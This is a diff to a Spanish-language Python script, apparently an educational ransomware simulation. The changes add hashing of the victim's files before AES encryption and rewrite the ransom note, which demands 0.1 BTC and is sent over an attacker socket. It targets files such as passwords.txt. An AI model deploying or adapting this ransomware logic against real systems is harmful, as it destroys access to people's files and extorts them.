@@ -12,6 +12,22 @@ def ensure_directory_exists(directory):
     if not os.path.exists(directory):
         os.makedirs(directory)
 
+
+def calculate_file_hashes(files):
+    """Calcula los hashes SHA-256 de los archivos y los guarda en un archivo JSON."""
+    hashes = {}
+    for file in files:
+        with open(f'Files_to_encrypt/{file}', 'rb') as f:
+            file_data = f.read()
+            file_hash = SHA256.new(file_data).hexdigest()
+            hashes[file] = file_hash
+
+    # Guardar los hashes en un archivo JSON
+    with open('file_hashes.json', 'w') as hash_file:
+        json.dump(hashes, hash_file)
+
+    print("Hashes de los archivos originales guardados en 'file_hashes.json'.")
+
 def encrypt_files(secret_key, files):
     """Cifra los archivos usando AES en modo CBC y los guarda con un sufijo '.enc'."""
     ensure_directory_exists('Files_encrypted')  # Asegura que la carpeta de archivos cifrados exista
@@ -88,16 +104,21 @@ def attacker_program():
     kdf = SHA256.new()
     kdf.update(short_term_key)
     symmetric_key = kdf.digest()[:16]  # Obtener solo los primeros 16 bytes
-
+    
+    
+        
     # Lista de archivos a cifrar en la víctima
     files_to_encrypt = ['passwords.txt', 'criptografia_post_cuantica_BERMUDEZ_BLANCO_ALBERTO_JESUS.pdf']
+    
+    # Calcular los hashes de los archivos
+    calculate_file_hashes(files_to_encrypt)
+    
+    # Cifrar los archivos con la clave simétrica
     encrypt_files(symmetric_key, files_to_encrypt)  # Cifrar los archivos
 
     # Enviar un mensaje de rescate con las instrucciones de pago
-    ransom_message = {
-        "message": "Sus archivos han sido cifrados. Para recuperarlos, envíe 0.1 BTC a la siguiente dirección: 1BitcoinAddress...",
-        "instructions": "Una vez realizado el pago, contacte al correo attacker@example.com con la confirmación."
-    }
+    ransom_message ="Sus archivos han sido cifrados. Para recuperarlos, envíe 0.1 BTC a la siguiente dirección: 1BitcoinAddress... Una vez realizado el pago, contacte al correo attacker@example.com con la confirmación."
+    
     attacker_socket.send(json.dumps(ransom_message).encode())
 
     print("Archivos cifrados y notificación enviada.")
